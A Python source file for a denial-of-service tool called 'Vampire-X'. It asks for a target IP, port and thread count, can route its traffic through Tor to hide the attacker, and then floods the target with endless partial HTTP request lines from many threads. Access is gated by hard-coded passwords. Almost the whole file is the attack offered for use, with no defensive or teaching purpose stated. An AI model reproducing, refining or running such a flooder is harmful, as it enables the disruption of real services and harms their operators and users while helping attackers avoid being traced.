import os
import sys
import time
import socket
import socks
import threading
import subprocess
from colorama import Fore, Style, init

init(autoreset=True)

# Admin & TOR Credentials
ADMIN_PASSWORD = "SH404"
TOR_PASSWORD = "SH404"

# Colorful Banner Functions
def admin_banner():
    print(Fore.RED + Style.BRIGHT + """
███████╗██╗░░░██╗██████╗░███╗░░░███╗██████╗░██╗███╗░░██╗███████╗██╗
██╔════╝╚██╗░██╔╝██╔══██╗████╗░████║██╔══██╗██║████╗░██║██╔════╝╚═╝
█████╗░░░╚████╔╝░██████╦╝██╔████╔██║██████╦╝██║██╔██╗██║█████╗░░░░░
██╔══╝░░░░╚██╔╝░░██╔══██╗██║╚██╔╝██║██╔══██╗██║██║╚████║██╔══╝░░░░░
███████╗░░░██║░░░██████╦╝██║░╚═╝░██║██████╦╝██║██║░╚███║███████╗██╗
╚══════╝░░░╚═╝░░░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝╚══════╝╚═╝
                      Vampire-X Admin Panel
""" + Style.RESET_ALL)

def user_banner():
    print(Fore.CYAN + Style.BRIGHT + """
██    ██ ██████  ██████  ██    ██ ██ ██████  ███████     ██
██    ██ ██   ██ ██   ██ ██    ██ ██ ██   ██ ██          ██
██    ██ ██████  ██████  ██    ██ ██ ██   ██ █████       ██
██    ██ ██      ██      ██    ██ ██ ██   ██ ██
 ██████  ██      ██       ██████  ██ ██████  ███████     ██
               Vampire-X User Panel
""" + Style.RESET_ALL)

# Tor Setup
def setup_tor():
    print(Fore.YELLOW + "[+] Initializing TOR for anonymous routing...")
    tor_check = subprocess.run(['which', 'tor'], capture_output=True, text=True)
    if tor_check.returncode != 0:
        print(Fore.YELLOW + "[*] Installing TOR...")
        os.system("pkg install tor -y")
    torrc_path = os.path.expanduser("~/.torrc")
    if not os.path.exists(torrc_path):
        with open(torrc_path, 'w') as f:
            f.write("SOCKSPort 9050\n")
    os.system("tor &")
    time.sleep(5)
    print(Fore.GREEN + "[+] TOR routing active.")

# Attack Function
def attack(target, port, thread_count, use_tor):
    def ddos():
        try:
            s = socks.socksocket()
            if use_tor:
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            s.connect((target, port))
            while True:
                s.sendto(b"GET / HTTP/1.1\r\n", (target, port))
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")
    print(Fore.GREEN + f"[TCP] Attack started on {target}:{port} with {thread_count} threads")
    for _ in range(thread_count):
        threading.Thread(target=ddos).start()

# Main Flow
def main():
    os.system("clear")
    mode = input(Fore.MAGENTA + "[?] Enter Mode (admin/user): ").strip().lower()
    if mode == "admin":
        passwd = input(Fore.YELLOW + "[!] Enter Admin Password: ")
        if passwd != ADMIN_PASSWORD:
            print(Fore.RED + "[X] Incorrect password!")
            sys.exit()
        admin_banner()
    elif mode == "user":
        user_banner()
    else:
        print(Fore.RED + "[X] Invalid Mode!")
        return

    anon = input(Fore.MAGENTA + "[?] Enable Anonymous Mode? (y/n): ").strip().lower()
    use_tor = False
    if anon == 'y':
        tor_pass = input(Fore.YELLOW + "[!] Enter TOR password to enable anonymity: ")
        if tor_pass == TOR_PASSWORD:
            setup_tor()
            use_tor = True
        else:
            print(Fore.RED + "[X] Incorrect TOR password!")
            return

    try:
        target = input(Fore.CYAN + "[+] Enter Target IP: ")
        port = int(input("[+] Enter Target Port: "))
        threads = int(input("[+] Enter Threads: "))
        attack(target, port, threads, use_tor)
    except Exception as e:
        print(Fore.RED + f"[!] Critical Error: {e}")
        print(Fore.YELLOW + "[*] Attempting auto-fix...")
        time.sleep(1)
        os.system("pip install -r requirements.txt || pip install socks colorama")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Script interrupted by user. Exiting...")
